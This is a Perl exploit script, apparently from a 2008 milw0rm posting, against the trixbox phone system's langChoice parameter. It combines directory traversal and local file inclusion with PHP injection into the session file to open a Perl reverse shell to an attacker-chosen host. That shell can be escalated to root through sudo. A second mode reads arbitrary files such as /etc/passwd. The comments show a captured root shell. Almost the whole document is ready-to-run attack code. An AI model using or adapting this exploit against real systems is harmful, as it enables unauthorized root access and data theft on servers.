<html><head><title>trixbox (langChoice) Local File Inclusion Exploit (connect-back) v2</title></head><pre>#!/usr/bin/perl -w

# Jean-Michel BESNARD &lt;jmbesnard@gmail.com&gt; / LEXSI Audit
# 2008-07-09
# This is an update of the previous exploit. We can now get a root shell, thanks to sudo.
#
# perl trixbox_fi_v2.pl 192.168.1.212
# Please listen carefully as our menu option has changed
# Choose from the following options:
#     1&gt; Remote TCP shell
#     2&gt; Read local file
# 1
# Host and port the reverse shell should connect to ? (&lt;host&gt;:&lt;port&gt;): 192.168.1.132:4444
# Which uid would you like for your shell ? (uid=root will be OK on most recent trixbox versions only): [root|asterisk]
# root
# Make sure you've opened a server socket on port 4444 at 192.168.1.132 (e.g, nc -l -p 4444)
# Press enter to continue...
# done...

# nc -l -v -p 4444
# listening on [any] 4444 ...
# connect to [192.168.1.132] from lexsi-abo-new.lexsi.com [192.168.1.212] 48397
# bash: no job control in this shell
# bash-3.1# id
# uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
# bash-3.1# 


use strict;
use Switch;
use LWP::UserAgent;
use HTTP::Cookies;

usage() unless @ARGV;
my $url = &quot;http://$ARGV[0]/user/index.php&quot;;
my $ua = LWP::UserAgent-&gt;new;
my $cookie_jar = HTTP::Cookies-&gt;new;
$ua-&gt;cookie_jar($cookie_jar);

menu();

sub execScript{
    my $scriptCode = shift;
    post($scriptCode);
    my $phpsessionid = extractPHPSID($cookie_jar-&gt;as_string);
    post(&quot;langChoice=../../../../../../../../../../tmp/sess_$phpsessionid%00&quot;);
}

sub post{
    my $postData = shift;
    my $req = HTTP::Request-&gt;new(POST =&gt; $url);
    $req-&gt;content_type('application/x-www-form-urlencoded');
    $req-&gt;content($postData);
    my $res = $ua-&gt;request($req);
    my $content = $res-&gt;content;
    return $content;
}

sub readFile{
    my $file = shift;
    my $content = post(&quot;langChoice=../../../../../../../../../..$file%00&quot;);
    my @fileLines = split(/\n/,$content);
    my $fileContent = &quot;Content of $file: \n\n&quot;;
    for(my $i=3;$i&lt;@fileLines;$i++){
	last if($fileLines[$i] =~ m/trixbox - User Mode/);
	$fileContent = $fileContent . $fileLines[$i-3] . &quot;\n&quot;;
    }
    return $fileContent;
}

sub tcp_reverse_shell{
    my $rhost= shift;
    my $rport = shift;
    my $uid = shift;
    my $rshell;
    if($uid eq &quot;asterisk&quot;){
	$rshell = &quot;langChoice=&lt;?php `/usr/bin/perl -MSocket -e '\\\$p=fork;exit,if(\\\$p);socket(S, PF_INET, SOCK_STREAM, getprotobyname('tcp'));connect(S, sockaddr_in($rport,inet_aton(\&quot;$rhost\&quot;)));open(STDIN, \&quot;&gt;%26S\&quot;);open(STDOUT,\&quot;&gt;%26S\&quot;);open(STDERR,\&quot;&gt;%26S\&quot;);exec({\&quot;/bin/sh\&quot;} (\&quot;JMB\&quot;, \&quot;-i\&quot;));'`;?&gt;%00&quot;;

    }else{
	$rshell = &quot;langChoice=&lt;?php `/usr/bin/perl -MSocket -e '\\\$p=fork;exit,if(\\\$p);socket(S, PF_INET, SOCK_STREAM, getprotobyname('tcp'));connect(S, sockaddr_in($rport,inet_aton(\&quot;$rhost\&quot;)));open(STDIN, \&quot;&gt;%26S\&quot;);open(STDOUT,\&quot;&gt;%26S\&quot;);open(STDERR,\&quot;&gt;%26S\&quot;);exec(\&quot;/usr/bin/sudo\&quot;,\&quot;/bin/bash\&quot;, (\&quot;-i\&quot;));'`;?&gt;%00&quot;;
    }
    execScript($rshell);
}


sub extractPHPSID{
    $_ = shift;
    if(/PHPSESSID=(\w+)/){
	return $1;
    } 
}

sub menu{
    print &lt;&lt;EOF;
Please listen carefully as our menu option has changed
Choose from the following options:
    1&gt; Remote TCP shell
    2&gt; Read local file
EOF
    my $option = &lt;STDIN&gt;;
    chop($option);
    switch($option){
	case 1 {
	    print &quot;Host and port the reverse shell should connect to ? &quot;;
	    print &quot;(&lt;host&gt;:&lt;port&gt;): &quot;;
	    my $hp=&lt;STDIN&gt;;
	    chop($hp);
	    print &quot;Which uid would you like for your shell ? (uid=root will be OK on most recent trixbox versions only): [root|asterisk]&quot;;
	    my $uid=&lt;STDIN&gt;;
	    chop($uid);
	    my($rhost,$rport) = split(/:/,$hp);
	    print &quot;Make sure you've opened a server socket on port $rport at $rhost (e.g, nc -l -p $rport)\n&quot;;
	    print &quot;Press enter to continue...&quot;;
	    &lt;STDIN&gt;;
	    tcp_reverse_shell($rhost,$rport,$uid);
	    print &quot;done...\n&quot;;
	    }
	case 2 {
	    while(1){
		print &quot;Full path (e.g. /etc/passwd): &quot;;
		my $file = &lt;STDIN&gt;;
		chop($file);
		print readFile($file) . &quot;\n\n&quot;;
	    }
	}
    }
}

sub usage{
    print &quot;./trixbox_fi.pl &lt;host&gt;\n&quot;;
    exit 1;
}

# milw0rm.com [2008-07-09]</pre></html>